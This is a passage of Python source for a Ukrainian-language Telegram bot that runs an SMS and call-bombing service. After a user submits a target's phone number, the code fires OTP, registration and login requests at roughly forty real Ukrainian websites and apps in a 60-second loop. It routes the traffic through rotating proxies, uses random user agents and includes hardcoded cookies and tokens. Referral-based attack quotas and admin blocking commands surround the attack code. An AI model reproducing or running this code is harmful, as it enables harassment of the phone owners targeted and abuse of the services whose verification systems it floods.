    # Видаляємо всі символи окрім цифр
    phone = re.sub(r'\D', '', phone)
    if phone.startswith('0'):
        phone = '380' + phone[1:]

    if not re.match(r"^\d{12}$", phone):
        await message.answer("❌ Невірний формат номера.\n\nВведіть номер повторно або напишіть <b>Скасувати</b> для відміни.\nПриклад: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"✅ Номер {phone} додано до чорного списку.", parse_mode="html", reply_markup=profile_keyboard)
    except Exception as e:
        await message.answer("❌ Сталася помилка при додаванні номера до чорного списку.", parse_mode="html", reply_markup=profile_keyboard)
        logging.error(f"Помилка при додаванні в чорний список: {e}")
    
    await state.finish()

@dp.message_handler(commands=['block'])
async def add_to_blacklist(message: Message):
    args = message.get_args()
    
    if not args:
        await message.answer("Будь ласка, введіть номер телефону для додавання до чорного списку.\nПриклад: /block 380XXXXXXXXX")
        return
    
    phone = args.strip()
    
    if not re.match(r"^\d{12}$", phone):
        await message.answer("Номер повинен бути формату: 380ХХХХХХХХХ. Будь ласка, введіть номер повторно.")
        return

    try:
        async with db_pool.acquire() as conn:
            await conn.execute("INSERT INTO blacklist (phone_number) VALUES ($1) ON CONFLICT DO NOTHING", phone)
        await message.answer(f"Номер {phone} додано до чорного списку.")
    except Exception as e:
        await message.answer("Сталася помилка при додаванні номера до чорного списку.")
        print(f"Помилка: {e}")

@dp.message_handler(commands=['nonstart'])
async def nonstart(message: Message):
    empty_keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    await message.answer("Я ж сказав не натискати...", reply_markup=empty_keyboard)


@dp.message_handler(text="Заблокувати користувача")
async def block_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🔴 <b>Блокування користувача</b>\n\nВведіть ID користувача для блокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.block_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.block_user)
async def process_block(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 1, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} заблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="Розблокувати користувача")
async def unblock_user(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer("🟢 <b>Розблокування користувача</b>\n\nВведіть ID користувача для розблокування:\n\n💡 Ви можете написати <b>Скасувати</b> для відміни.", parse_mode="html")
        await Dialog.unblock_user.set()
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(state=Dialog.unblock_user)
async def process_unblock(message: Message, state: FSMContext):
    user_id = message.text.strip()
    
    # Перевіряємо на скасування
    if user_id.lower() in ['скасувати', 'отмена', 'отмінити', 'cancel']:
        await state.finish()
        await message.answer("❌ Операцію скасовано.", reply_markup=profile_keyboard)
        return
    
    if user_id.isdigit():
        user_id = int(user_id)
        async with db_pool.acquire() as conn:
            await conn.execute("UPDATE users SET block = $1 WHERE user_id = $2", 0, user_id)
        await message.answer(f"✅ Користувача з ID {user_id} розблоковано.", reply_markup=profile_keyboard)
    else:
        await message.answer("❌ Некоректний ID користувача.\n\nВведіть числовий ID або напишіть <b>Скасувати</b> для відміни.", parse_mode="html")
        return
    
    await state.finish()

@dp.message_handler(text="Реферали")
async def show_referrals(message: Message):
    if message.from_user.id in ADMIN:
        async with db_pool.acquire() as conn:
            referrals = await conn.fetch('''
                SELECT user_id, name, username, referral_count 
                FROM users 
                WHERE referral_count > 0 
                ORDER BY referral_count DESC
            ''')
        
        if not referrals:
            await message.answer("Поки що немає користувачів з рефералами.")
            return
        
        message_text = "👥 <b>Користувачі з рефералами:</b>\n\n"
        
        for ref in referrals:
            user_id = ref['user_id']
            name = ref['name'] or "Без імені"
            username = ref['username'] or "Без username"
            count = ref['referral_count']
            
            message_text += f"• <a href='tg://user?id={user_id}'>{name}</a> (@{username})\n"
            message_text += f"  └ Кількість рефералів: {count}\n\n"
        
        await message.answer(message_text, parse_mode="HTML")
    else:
        await message.answer("Недостатньо прав.")

@dp.message_handler(text="Назад")
async def back_to_admin_menu(message: Message):
    if message.from_user.id in ADMIN:
        await message.answer('Ви повернулись до головного меню.', reply_markup=profile_keyboard)
    else:
        await message.answer('Ви не є адміном.')

@dp.message_handler(text='🆘 Допомога')
@dp.throttled(anti_flood, rate=3)
async def help(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    inline_keyboard = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard = inline_keyboard.add(code_sub)
    await bot.send_message(message.chat.id, "Виникли питання? Звертайся до @Nobysss", disable_web_page_preview=True, parse_mode="HTML", reply_markup=inline_keyboard)



@dp.message_handler(text='🎪 Запросити друга')
async def referral_program(message: types.Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    async with db_pool.acquire() as conn:
        referral_data = await conn.fetchrow(
            'SELECT referral_count, referral_attacks, unused_referral_attacks FROM users WHERE user_id = $1',
            user_id
        )
        
        referral_count = referral_data['referral_count'] if referral_data else 0
        referral_attacks = referral_data['referral_attacks'] if referral_data else 0
        unused_referral_attacks = referral_data['unused_referral_attacks'] if referral_data else 0
        
        referral_total = referral_attacks + unused_referral_attacks
        
        bot_username = (await bot.me).username
        referral_link = f"https://t.me/{bot_username}?start={user_id}"
        
        referrals = await conn.fetch(
            'SELECT u.user_id, u.name, u.username, r.join_date FROM referrals r JOIN users u ON r.referred_id = u.user_id WHERE r.referrer_id = $1 ORDER BY r.join_date DESC',
            user_id
        )
    
    message_text = f"🎪 <b>Запросити друга</b>\n\n"
    message_text += f"🔗 Ваше посилання для друга:\n<code>{referral_link}</code>\n\n"
    message_text += "💡 <b>Як це працює?</b>\n"
    message_text += "• 🎯 Поділися посиланням з другом\n"
    message_text += "• 🎉 Коли друг підпишеться на канал — він стане частиною нашої спільноти\n"
    message_text += "• 🚀 Завдяки тобі ми зможемо зростати та робити для тебе ще більше\n\n"
    
    if referrals:
        message_text += f"📊 <b>Статистика:</b>\n"
        message_text += f"├ Всього рефералів: {referral_count}\n"
        message_text += f"├ Доступно атак от рефералов: {referral_total}\n"
        if unused_referral_attacks > 0:
            message_text += f"└ Накопичено атак: {unused_referral_attacks}\n"
        message_text += f"\n<b>Ваші реферали:</b>\n"
        for ref in referrals:
            ref_name = ref['username'] or ref['name'] or f"User{ref['user_id']}"
            message_text += f"• <a href='tg://user?id={ref['user_id']}'>{ref_name}</a> - {ref['join_date'].strftime('%d.%m.%Y')}\n"
    
    keyboard = InlineKeyboardMarkup()
    share_text = "Привіт! Приєднуйся до нашого боту! 📱 Завдяки тобі ми зможемо зростати та робити для тебе ще більше 🚀"
    encoded_text = urllib.parse.quote(share_text)
    share_url = f"https://t.me/share/url?url={referral_link}&text={encoded_text}"
    keyboard.add(InlineKeyboardButton("🎯 Поділитися посиланням", url=share_url))
    
    await message.answer(message_text, parse_mode='HTML', reply_markup=keyboard)

@dp.message_handler(text='🎯 Почати атаку')
async def start_attack_prompt(message: Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if result and result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return
    
    if not await check_subscription_status(user_id):
        await message.answer("Ви відписалися від каналу. Підпишіться, щоб продовжити використання бота.", reply_markup=checkSubMenu)
        return
    
    # Бот безлімітний - перевірка лімітів вимкнена
    
    message_text = '🎯 Готовий до атаки!\n\n💥 Очікую на номер телефону..'
    
    await message.answer(message_text, parse_mode="html", reply_markup=profile_keyboard)

async def send_request(url, data=None, json=None, headers=None, method='POST', cookies=None, proxy=None, proxy_auth=None):
    async with aiohttp.ClientSession(cookies=cookies) as session:
        if method == 'POST':
            async with session.post(url, data=data, json=json, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        elif method == 'GET':
            async with session.get(url, headers=headers, proxy=proxy, proxy_auth=proxy_auth) as response:
                return response
        else:
            raise ValueError(f"Unsupported method {method}")

async def ukr(number, chat_id, proxy_url=None, proxy_auth=None):
    headers = {"User-Agent": fake_useragent.UserAgent().random}

    csrf_url = "https://auto.ria.com/iframe-ria-login/registration/2/4"
    try:
        csrf_token = await get_csrf_token(csrf_url, headers=headers)
    except ValueError as e:
        logging.error(f"Не вдалося отримати CSRF-токен: {e}")
        return

    logging.info(f"Отримано CSRF-токен: {csrf_token}")

    formatted_number = f"+{number[:2]} {number[2:5]} {number[5:8]} {number[8:10]} {number[10:]}"
    formatted_number2 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:10]}+{number[10:]}"
    formatted_number3 = f"+{number[:2]}+({number[2:5]})+{number[5:8]}+{number[8:]}"
    formatted_number4 = f"+{number[:2]}({number[2:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number5 = f"+{number[:3]}({number[3:6]}){number[6:9]}-{number[9:11]}-{number[11:]}"
    formatted_number6 = f"+{number[:3]}({number[3:5]}){number[5:8]}-{number[8:10]}-{number[10:]}"
    formatted_number7 = f"+{number[:3]}({number[3:6]}) {number[6:9]}-{number[9:11]}-{number[11:]}"
    raw_phone = f"({number[3:6]})+{number[6:9]}+{number[9:]}"

    logging.info(f"Запуск атаки на номер {number}")

    async def send_request_and_log(url, **kwargs):
        try:
            if not attack_flags.get(chat_id):
                return
                
            timeout = aiohttp.ClientTimeout(total=5)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                method = kwargs.pop('method', 'POST')
                # sanitize encodings to avoid brotli dependency
                hdrs = kwargs.get('headers') or {}
                try:
                    hdrs['Accept-Encoding'] = 'gzip, deflate'
                except Exception:
                    pass
                kwargs['headers'] = hdrs
                async with session.request(method, url, **kwargs) as response:
                    if response.status == 200:
                        logging.info(f"Успіх - {number}")
        except asyncio.TimeoutError:
            logging.error(f"Таймаут при запиті до {url}")
        except aiohttp.ClientError as e:
            logging.error(f"Помилка підключення до {url}: {e}")
        except Exception as e:
            logging.error(f"Невідома помилка при запиті до {url}: {e}")

    semaphore = asyncio.Semaphore(5)

    async def bounded_request(url, **kwargs):
        if not attack_flags.get(chat_id):
            return
        async with semaphore:
            await send_request_and_log(url, **kwargs)

    # Helper: attach fixed proxy for this iteration
    def with_proxy(kwargs):
        if proxy_url:
            kwargs.update({"proxy": proxy_url, "proxy_auth": proxy_auth})
        return kwargs

    tasks = [
        bounded_request("https://my.telegram.org/auth/send_password", **with_proxy({"data": {"phone": "+" + number}, "headers": headers})),
        bounded_request("https://helsi.me/api/healthy/v2/accounts/login", **with_proxy({"json": {"phone": number, "platform": "PISWeb"}, "headers": headers})),
        bounded_request("https://auth.multiplex.ua/login", **with_proxy({"json": {"login": "+" + number}, "headers": headers})),
        bounded_request("https://api.pizzaday.ua/api/V1/user/sendCode", **with_proxy({"json": {"applicationSend": "sms", "lang": "uk", "phone": number}, "headers": headers})),
        bounded_request("https://stationpizza.com.ua/api/v1/auth/phone-auth", **with_proxy({"json": {"needSubscribeForNews": "false", "phone": formatted_number}, "headers": headers})),
        bounded_request("https://core.takeuseat.in.ua/auth/user/requestSMSVerification", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
        bounded_request("https://aurum.in.ua/local/ajax/authorize.php?lang=ua", **with_proxy({"json": {"phone": formatted_number, "type": ""}, "headers": headers})),
        bounded_request("https://pizza-time.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request("https://iq-pizza.eatery.club/site/v1/pre-login", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request("https://dnipro-m.ua/ru/phone-verification/", **with_proxy({"json": {"phone": number}, "headers": headers_dnipro, "cookies": cookies_dnipro})),
        bounded_request("https://my.ctrs.com.ua/api/v2/signup", **with_proxy({"json": {"email": "finn889ik@gmail.com", "name": "Денис", "phone": number}, "headers": headers_citrus, "cookies": cookies_citrus})),
        bounded_request("https://my.ctrs.com.ua/api/auth/login", **with_proxy({"json": {"identity": "+" + number}, "headers": headers_citrus, "cookies": cookies_citrus})),
        bounded_request("https://auth.easypay.ua/api/check", **with_proxy({"json": {"phone": number}, "headers": headers_easypay})),
        bounded_request("https://sandalini.ua/ru/signup/", **with_proxy({"data": {"data[firstname]": "деня", "data[phone]": formatted_number2, "wa_json_mode": "1", "need_redirects  ": "1", "contact_type": "person"}, "headers": headers})),
        bounded_request("https://uvape.pro/index.php?route=account/register/add", **with_proxy({"data": {"firstname": "деня", "telephone": formatted_number3, "email": "random@gmail.com", "password": "VHHsq6b#v.q>]Fk"}, "headers": headers_uvape, "cookies": cookies_uvape})),
        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
        bounded_request("https://vandalvape.life/index.php?route=extension/module/sms_reg/SmsCheck", **with_proxy({"data": {"phone": formatted_number4, "only_sms": "1"}, "headers": headers})),
        bounded_request("https://terra-vape.com.ua/index.php?route=common/modal_register/register_validate", **with_proxy({"data": {"firstname": "деня", "lastname": "деневич", "email": "randi@gmail.com", "telephone": number, "password": "password24-", "smscode": "", "step": "first_step"}, "headers": headers_terravape, "cookies": cookies_terravape})),
        bounded_request("https://im.comfy.ua/api/auth/v3/otp/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request("https://im.comfy.ua/api/auth/v3/ivr/send", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request("https://www.moyo.ua/identity/registration", **with_proxy({"data": {"firstname": "деня", "phone": formatted_number5, "email": "rando@gmail.com"}, "headers": headers_moyo, "cookies": cookies_moyo})),
        bounded_request("https://pizza.od.ua/ajax/reg.php", **with_proxy({"data": {"phone": formatted_number4}, "headers": headers})),
        bounded_request("https://sushiya.ua/ru/api/v1/user/auth", **with_proxy({"data": {"phone": number[2:], "need_skeep": ""}, "headers": headers_sushiya})),
        bounded_request("https://avrora.ua/index.php?dispatch=otp.send", **with_proxy({"data": {"phone": formatted_number6, "security_hash": "0dc890802de67228597af47d95a7f52b", "is_ajax": "1"}, "headers": headers})),
        bounded_request("https://zolotakraina.ua/ua/turbosms/verification/code", **with_proxy({"data": {"telephone": number, "email": "rando@gmail.com", "form_key": "PKRxVkPlQqBlb8Wi"}, "headers": headers_zolota, "cookies": cookies_zolota})),
        bounded_request("https://auto.ria.com/iframe-ria-login/registration/2/4", **with_proxy({"data": {"_csrf": csrf_token, "RegistrationForm[email]": f"{number}", "RegistrationForm[name]": "деня", "RegistrationForm[second_name]": "деневич", "RegistrationForm[agree]": "1", "RegistrationForm[need_sms]": "1"}, "headers": headers_avtoria, "cookies": cookies_avtoria})),
        bounded_request(f"https://ukrpas.ua/login?phone=+{number}", **with_proxy({"method": 'GET', "headers": headers})),
        bounded_request("https://maslotom.com/api/index.php?route=api/account/phoneLogin", **with_proxy({"data": {"phone": formatted_number6}, "headers": headers})),
        bounded_request("https://varus.ua/api/ext/uas/auth/send-otp?storeCode=ua", **with_proxy({"json": {"phone": "+" + number}, "headers": headers})),
        bounded_request("https://getvape.com.ua/index.php?route=extension/module/regsms/sendcode", **with_proxy({"data": {"telephone": formatted_number7}, "headers": headers})),
        bounded_request("https://api.iqos.com.ua/v1/auth/otp", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request(f"https://llty-api.lvivkholod.com/api/client/{number}", **with_proxy({"method": 'POST', "headers": headers})),
        bounded_request("https://api-mobile.planetakino.ua/graphql", **with_proxy({"json": {"query": "mutation customerVerifyByPhone($phone: String!) { customerVerifyByPhone(phone: $phone) { isRegistered }}", "variables": {"phone": "+" + number}}, "headers": headers})),
        bounded_request("https://back.trofim.com.ua/api/via-phone-number", **with_proxy({"json": {"phone": number}, "headers": headers})),
        bounded_request("https://dracula.robota.ua/?q=SendOtpCode", **with_proxy({"json": {"operationName": "SendOtpCode", "query": "mutation SendOtpCode($phone: String!) {  users {    login {      otpLogin {        sendConfirmation(phone: $phone) {          status          remainingAttempts          __typename        }        __typename      }      __typename    }    __typename  }}", "variables": {"phone": number}}, "headers": headers})),
        bounded_request(f"https://shop.kyivstar.ua/api/v2/otp_login/send/{number[2:]}", **with_proxy({"method": 'GET', "headers": headers})),
        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "code"}, "headers": headers_elmir, "cookies": cookies_elmir})),
        bounded_request("https://elmir.ua/response/load_json.php?type=validate_phone", **with_proxy({"data": {"fields[phone]": "+" + number, "fields[call_from]": "register", "fields[sms_code]": "", "action": "call"}, "headers": headers_elmir_call, "cookies": cookies_elmir_call})),
        bounded_request(f"https://bars.itbi.com.ua/smart-cards-api/common/users/otp?lang=uk&phone={number}", **with_proxy({"method": 'GET', "headers": headers})),
        bounded_request("https://api.kolomarket.abmloyalty.app/v2.1/client/registration", **with_proxy({"json": {"phone": number, "password": "!EsRP2S-$s?DjT@", "token": "null"}, "headers": headers}))
    ]

    if not attack_flags.get(chat_id):
        return
        
    for task in tasks:
        if not attack_flags.get(chat_id):
            return
        await task

async def start_attack(number, chat_id):
    global attack_flags
    attack_flags[chat_id] = True
    
    timeout = 60
    start_time = asyncio.get_event_loop().time()

    try:
        await check_and_update_proxies()
        snapshot = proxies_healthy.copy()
        # choose least-used proxy (then by lower latency) for the whole attack session
        p_url = None
        p_auth = None
        if snapshot:
            try:
                # map latency by key
                lat_by_key = {}
                for item in proxies_stats:
                    e = item['entry']
                    lat_by_key[proxy_key(e)] = item.get('latency_ms', 999999)
                # select min by (usage, latency)
                best_entry = min(
                    snapshot,
                    key=lambda e: (proxies_usage.get(proxy_key(e), 0), lat_by_key.get(proxy_key(e), 999999))
                )
                key = proxy_key(best_entry)
                proxies_usage[key] = proxies_usage.get(key, 0) + 1
                p_url, p_auth = build_proxy_params(best_entry)
                logging.info(f"Using proxy for attack: {best_entry['host']}:{best_entry['port']}")
            except Exception:
                p_url, p_auth = None, None
        while (asyncio.get_event_loop().time() - start_time) < timeout:
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                try:
                    msg_id = last_status_msg.get(chat_id)
                    if msg_id:
                        await bot.edit_message_text("🛑 Атака зупинена користувачем.", chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
                return
            
            await ukr(number, chat_id, proxy_url=p_url, proxy_auth=p_auth)
            
            if not attack_flags.get(chat_id):
                logging.info(f"Атаку на номер {number} зупинено користувачем.")
                await bot.send_message(chat_id, "🛑 Атака зупинена користувачем.")
                return
                
            await asyncio.sleep(0.1)
            
    except asyncio.CancelledError:
        try:
            msg_id = last_status_msg.get(chat_id)
            if msg_id:
                await bot.edit_message_text("🛑 Атака зупинена.", chat_id=chat_id, message_id=msg_id)
        except Exception:
            pass
    except Exception as e:
        logging.error(f"Помилка при виконанні атаки: {e}")
        await bot.send_message(chat_id, "❌ Сталася помилка при виконанні атаки.")
    finally:
        attack_flags[chat_id] = False

    logging.info(f"Атака на номер {number} завершена")
    
    async with db_pool.acquire() as conn:
        user_data = await conn.fetchrow(
            'SELECT attacks_left, promo_attacks, referral_attacks FROM users WHERE user_id = $1',
            chat_id
        )
    attacks_left = user_data['attacks_left'] if user_data else 0
    promo_attacks = user_data['promo_attacks'] if user_data else 0
    referral_attacks = user_data['referral_attacks'] if user_data and 'referral_attacks' in user_data else 0
    total_attacks = attacks_left + promo_attacks + referral_attacks
    
    inline_keyboard2 = types.InlineKeyboardMarkup()
    code_sub = types.InlineKeyboardButton(text='🎪 Канал', url='https://t.me/+tod0WSFEpEQ2ODcy')
    inline_keyboard2 = inline_keyboard2.add(code_sub)
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=f"""👍 Атака на номер <i>{number}</i> завершена!

🔥 Сподобалась робота бота? 
Допоможи нам зростати — запроси друга!

💬 Якщо є питання або пропозиції, звертайся до @Nobysss

Приєднуйся до нашого ком'юніті 👇""",
                parse_mode="html"
            )
    except Exception:
        pass

@dp.message_handler(lambda message: message.text and not message.text.startswith('/start'), content_types=['text'])
@dp.throttled(anti_flood, rate=3)
async def handle_phone_number(message: Message):
    # Перевіряємо, що повідомлення з особистого чату
    if message.chat.type != 'private':
        return  # Ігноруємо повідомлення з груп
    
    # Ігноруємо текст кнопок
    button_texts = ['🆘 Допомога', '🎪 Запросити друга', '🎯 Почати атаку']
    if message.text in button_texts:
        return
    
    user_id = message.from_user.id
    
    if not await user_exists(user_id):
        await message.answer("Для використання бота потрібно натиснути /start")
        return
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow("SELECT block FROM users WHERE user_id = $1", user_id)
    
    if not result:
        await message.answer("Помилка: Не вдалося знайти користувача.")
        return

    if result['block'] == 1:
        await message.answer("Вас заблоковано і ви не можете користуватися ботом.")
        return

    number = message.text.strip()
    chat_id = message.chat.id
    
    number = re.sub(r'\D', '', number)
    if number.startswith('0'):
        number = '380' + number[1:]

    if len(number) == 12 and number.startswith('380'):
        async with db_pool.acquire() as conn:
            is_blacklisted = await conn.fetchval("SELECT 1 FROM blacklist WHERE phone_number = $1", number)
        if is_blacklisted:
            await message.answer(f"Номер <i>{number}</i> захищений від атаки.", parse_mode="html")
            return

        # Бот безлімітний - оновлюємо тільки дату останньої атаки
        async with db_pool.acquire() as conn:
            await conn.execute(
                'UPDATE users SET last_attack_date = $1 WHERE user_id = $2',
                datetime.now(), user_id
            )
        cancel_keyboard = get_cancel_keyboard()
        attack_flags[chat_id] = True 
        status_msg = await message.answer(
            f'🎯 Місія розпочата!\n\n📱 Ціль: <i>{number}</i>\n\n⚡ Статус: В процесі...',
            parse_mode="html",
            reply_markup=get_cancel_keyboard()
        )
        last_status_msg[chat_id] = status_msg.message_id

        asyncio.create_task(start_attack(number, chat_id))
    else:
        await message.answer("Невірний формат номера.\nВведіть номер повторно.\nПриклад: <i>🇺🇦380XXXXXXXXX</i>", parse_mode="html")

@dp.callback_query_handler(lambda c: c.data == "cancel_attack")
async def cancel_attack(callback_query: types.CallbackQuery):
    chat_id = callback_query.message.chat.id
    attack_flags[chat_id] = False
    await callback_query.answer("Зупиняємо...")
    try:
        msg_id = last_status_msg.get(chat_id)
        if msg_id:
            await bot.edit_message_text("🛑 Зупиняємо атаку...", chat_id=chat_id, message_id=msg_id)
    except Exception:
        pass

async def check_attack_limits(user_id: int):
    today = datetime.now().date()
    
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow(
            "SELECT attacks_left, promo_attacks, referral_attacks, unused_referral_attacks, last_attack_date FROM users WHERE user_id = $1",
            user_id
        )
        
        if not result:
            return False, 0, 0, 0
        
        attacks_left = result['attacks_left']
        promo_attacks = result['promo_attacks']
        referral_attacks = result['referral_attacks']
        unused_referral_attacks = result['unused_referral_attacks']
        last_attack_date = result['last_attack_date']
        
        # Приводим last_attack_date к дате для корректного сравнения
        if last_attack_date:
            last_attack_date_only = last_attack_date.date()
        else:
            last_attack_date_only = today
        
        # Перевіряємо, чи потрібно скинути атаки на новий день
        if last_attack_date_only != today:
            # Зберігаємо невикористані реферальні атаки
            if referral_attacks > 0:
                unused_referral_attacks += referral_attacks
            # Скидаємо звичайні атаки на 6, додаємо накопичені реферальні
            new_attacks = 6 + unused_referral_attacks
            await conn.execute(
                "UPDATE users SET attacks_left = $1, referral_attacks = 0, unused_referral_attacks = 0, last_attack_date = $2 WHERE user_id = $3",
                new_attacks, today, user_id
            )
            attacks_left = new_attacks
            referral_attacks = 0
            unused_referral_attacks = 0
        
        total_attacks = attacks_left + promo_attacks + referral_attacks
        can_attack = total_attacks > 0
        
        return can_attack, attacks_left, promo_attacks, referral_attacks

async def user_exists(user_id: int) -> bool:
    """
    Проверяет, существует ли пользователь в базе данных
    """
    async with db_pool.acquire() as conn:
        result = await conn.fetchrow('SELECT 1 FROM users WHERE user_id = $1', user_id)
    return result is not None

# РОЗЫГРЫШ VIP-СТАТУСА

# Удалить этот обработчик:
# @dp.message_handler(lambda message: message.chat.type in ['group', 'supergroup'] and message.text and f'@{bot._me.username}' in message.text if hasattr(bot, '_me') else False)

# Добавить вместо него inline-обработчики:

@dp.inline_handler()
async def inline_giveaway(inline_query: types.InlineQuery):
    """Обработчик inline-запросов для розыгрыша"""
    user_id = inline_query.from_user.id
    
    # Перевіряємо, що inline-запит йде з групового чату
    # Якщо inline використовується в особистому чаті - не показуємо розіграш
    if inline_query.chat_type not in ['group', 'supergroup']:
        results = [
            types.InlineQueryResultArticle(
                id='group_only',
                title='🎪 Тільки для груп',
                description='Розіграш доступний тільки в групових чатах',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Розіграш VIP-статусу доступний лише в групових чатах!'
                )
            )
        ]
        await bot.answer_inline_query(inline_query.id, results, cache_time=1)
        return
    
    # Перевіряємо права користувача
    if user_id not in ADMIN:
        # Для обычных пользователей показываем "отказ"
        results = [
            types.InlineQueryResultArticle(
                id='no_access',
                title='🎪 Немає доступу',
                description='Тільки адміністратори можуть проводити розіграші',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎪 Тільки адміністратори можуть проводити розіграші!'
                )
            )
        ]
    else:
        # Для админов показываем кнопку розыгрыша
        results = [
            types.InlineQueryResultArticle(
                id='start_giveaway',
                title='🎪 Розіграш VIP-статусу',
                description='Визначити випадкового переможця серед активних користувачів',
                input_message_content=types.InputTextMessageContent(
                    message_text='🎉 <b>Розіграш VIP-статусу</b>\n\nГотовий обрати випадкового переможця серед усіх активних користувачів бота!\nНатисніть кнопку нижче, щоб запустити розіграш 🎲',
                    parse_mode='HTML'
                ),
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("🎪 Визначити переможця", callback_data="start_giveaway")
                )
            )
        ]
    
    await bot.answer_inline_query(inline_query.id, results, cache_time=1)

@dp.callback_query_handler(lambda c: c.data == "start_giveaway")
async def start_giveaway(callback_query: types.CallbackQuery):
    """Запуск розыгрыша VIP-статуса"""
    user_id = callback_query.from_user.id
    
    # Перевіряємо права
    if user_id not in ADMIN:
        await callback_query.answer("🚫 Недостатньо прав!", show_alert=True)
        return
    
    # Отримуємо інформацію про чат з inline_message_id або message
    chat_id = None
    message_id = None
    
    if callback_query.message:
        chat_id = callback_query.message.chat.id
        message_id = callback_query.message.message_id
        chat_type = callback_query.message.chat.type
    elif callback_query.inline_message_id:
        # Для inline-повідомлень запускаємо повну анімацію
        await callback_query.answer("🎰 Запускаю розыгрыш...")
        
        # Отримуємо список активних користувачів
        async with db_pool.acquire() as conn:
            users = await conn.fetch('SELECT user_id, name, username FROM users WHERE block = 0')
        
        if not users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Фільтруємо активних користувачів
        active_users = []
        for user in users:
            try:
                await bot.send_chat_action(user['user_id'], 'typing')
                active_users.append(user)
            except (BotBlocked, UserDeactivated, ChatNotFound):
                continue
            except Exception:
                continue
        
        if not active_users:
            await bot.edit_message_text(
                "❌ Нет активных пользователей для розыгрыша!",
                inline_message_id=callback_query.inline_message_id
            )
            return
        
        # Запускаємо анімацію для inline-повідомлення
        await run_inline_giveaway_animation(callback_query.inline_message_id, active_users)
        return
    else:
        await callback_query.answer("❌ Помилка: не вдалося визначити чат!", show_alert=True)
        return
    
    # Перевіряємо, що це груповий чат
    if chat_type not in ['group', 'supergroup']:
        await callback_query.answer("🚫 Розыгрыш доступен только в групповых чатах!", show_alert=True)
        return
    
    # Перевіряємо, чи не йде вже розіграш
    if giveaway_flags.get(chat_id):
        await callback_query.answer("⏳ Розыгрыш уже идет!", show_alert=True)
        return
    
    await callback_query.answer("🎰 Запускаю розыгрыш...")
    giveaway_flags[chat_id] = True
    
    try:
